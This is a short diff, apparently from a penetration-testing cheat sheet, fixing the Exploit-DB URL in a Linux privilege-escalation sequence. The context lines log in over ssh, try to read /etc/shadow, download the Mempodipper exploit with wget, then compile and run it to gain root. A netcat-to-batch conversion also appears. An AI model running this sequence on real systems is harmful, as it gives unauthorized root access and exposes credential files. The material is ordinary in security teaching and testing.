@@ -85,7 +85,7 @@ wine exe2bat.exe nc.exe nc.txt
 ssh user@<target IP>
 id                                              # verify user permissions
 cat /etc/shadow                                 # access denied
-wget -O exploit.c http://www.exploit5db.com/download/18411
+wget -O exploit.c http://www.exploit-db.com/download/18411
 gcc -o mempodipper exploit.c                    # compile exploit
 ./mempodipper                                   # run exploit
 id                                              # verify root permissions
